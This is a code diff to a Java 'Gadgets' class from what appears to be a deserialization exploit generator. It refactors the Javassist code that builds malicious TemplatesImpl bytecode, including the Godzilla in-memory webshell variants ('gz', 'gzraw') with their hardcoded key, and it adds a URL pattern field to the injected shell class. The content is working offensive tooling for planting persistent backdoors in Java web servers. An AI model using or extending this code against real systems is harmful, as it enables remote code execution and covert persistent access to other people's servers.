@@ -341,7 +341,7 @@ public class Gadgets {
 			Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
 		} else {
 			CtClass newClass = pool.makeClass(generateClassName());
-			newClass.addField(CtField.make("private static final long serialVersionUID = 8207363842866235160L;", newClass));
+			insertField(newClass, "serialVersionUID", "private static final long serialVersionUID = 8207363842866235160L;");
 
 			Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, newClass.toBytecode()});
 			// 当 _transletIndex >= 0 且 classCount 也就是生成类的数量大于 1 时，不需要继承 AbstractTranslet
@@ -409,8 +409,8 @@ public class Gadgets {
 				break;
 			// 哥斯拉类型的内存马
 			case "gz":
-				ctClass.addField(CtField.make("Class payload ;", ctClass));
-				ctClass.addField(CtField.make("String xc = \"7ff9fe91aaa7d3aa\";", ctClass));
+				insertField(ctClass, "payload", "Class payload ;");
+				insertField(ctClass, "xc", "String xc = \"7ff9fe91aaa7d3aa\";");
 
 				ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
 				ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
@@ -421,8 +421,8 @@ public class Gadgets {
 				break;
 			// 哥斯拉 raw 类型的内存马
 			case "gzraw":
-				ctClass.addField(CtField.make("Class payload ;", ctClass));
-				ctClass.addField(CtField.make("String xc = \"7ff9fe91aaa7d3aa\";", ctClass));
+				insertField(ctClass, "payload", "Class payload ;");
+				insertField(ctClass, "xc", "String xc = \"7ff9fe91aaa7d3aa\";");
 
 				ctClass.addMethod(CtMethod.make(Utils.base64Decode(AES_FOR_GODZILLA), ctClass));
 
@@ -463,6 +463,8 @@ public class Gadgets {
 		}
 
 		ctClass.setName(generateClassName());
+		insertField(ctClass, "pattern", "public static String pattern = \"" + URL_PATTERN + "\";");
+
 	}
 
 	public static void insertMethod(CtClass ctClass, String method, String payload) throws NotFoundException, CannotCompileException {
@@ -493,5 +495,15 @@ public class Gadgets {
 		} else {
 			ctClass.addMethod(CtMethod.make(Utils.base64Decode(EXEC_CMD), ctClass));
 		}
+	}
+
+	public static void insertField(CtClass ctClass, String fieldName, String fieldCode) throws Exception {
+		ctClass.defrost();
+		try {
+			CtField ctSUID = ctClass.getDeclaredField(fieldName);
+			ctClass.removeField(ctSUID);
+		} catch (javassist.NotFoundException ignored) {
+		}
+		ctClass.addField(CtField.make(fieldCode, ctClass));
 	}
 }
